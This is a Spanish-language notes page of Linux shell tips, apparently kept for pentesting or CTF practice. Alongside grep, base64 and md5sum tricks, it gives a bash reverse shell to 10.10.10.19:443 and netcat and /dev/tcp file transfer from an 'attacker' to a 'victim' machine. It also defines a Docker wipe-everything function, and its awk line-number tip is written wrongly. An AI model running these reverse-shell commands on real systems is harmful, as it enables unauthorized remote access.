# tips y cosas curiosas

&> /dev/null : para no mostrar errores disown para mostrarlo en segundo plano y que si cierras la terminal no se mate el proceso & para concatenar ambos comandos

ejemplo

```
burpsuite &> /dev/null & disown
```

```
base64 -d <cadena> 
```

decodea una cadena en base64

```
&> /dev/tcp/ip/puerto 0>&1 
```

manda una peticion tcp a la ip y al puerto correspondiente > para redigir salidas (stout) &> redirige stdout y stderr a la vez

0= stdin 1=stdout

```
echo -n 
```

no hace un salto de linea en la salida

```
awk 'NR=131'
```

para que muestre la linea 131 en un cat por ejemplo

```
grep -v "cadena"
```

no muestra las lineas con esa cadena correspondiente

```
echo -n "admin" | md5sum
```

podemos mostrar el hash md5 de una cadena, importante ponerle el -n para evitar el salto de linea porque sino el hash cambiará y no corresponderá a la cadena que hayamos indicado

```
└─$ # Añade la función cleanDocker a ~/.zshrc solo si no existe ya
if ! grep -q "^cleanDocker ()" "$HOME/.zshrc"; then
  cat <<'EOF' >> "$HOME/.zshrc"

# cleanDocker: elimina todos los contenedores, imágenes, redes y volúmenes (peligroso)
cleanDocker () {
  docker rm $(docker ps -a -q) --force 2>/dev/null
  docker rmi $(docker images -q) 2>/dev/null
  docker network rm $(docker network ls -q) 2>/dev/null
  docker volume rm $(docker volume ls -q) 2>/dev/null
}
EOF
  echo "Función cleanDocker añadida a ~/.zshrc"
else
  echo "La función cleanDocker ya existe en ~/.zshrc — nada que hacer."
fi

```

mandar una terminal a mi maquina local

!\[\[Pasted image 20251011145148.png]]

```
bash -c "bash -i >& /dev/tcp/10.10.10.19/443 0>&1"
```

tambien puedes transferir archivos desde tu maquina atacante a la maquina victima de la siguiente forma:

te pones en escucha compartiendo el archivo

```
nc -nlvp 443 < archivo.txt
```

y desde la maquina victima:

el input de cat que en este caso es el archivo.txt lo ponemos en otro archivo.txt que nosotros creamos de la siguiente forma. este output se puede llamar como nosotros queramos

```
cat < /dev/tcp/<ip maquina atacante>/<puerto> > archivo.txt
```

para ver si se ha descargado correctamente hacemos un md5sum del archivo y si el archivo coincide es que no ha sido alterado

```
md5sum archivo.txt
```

para filtrar por cosas que no queremos ver en el output:

```
grep -v 
```

si queremos filtrar por varias cosas que no aparezcan

grep -vE "hola|adios"
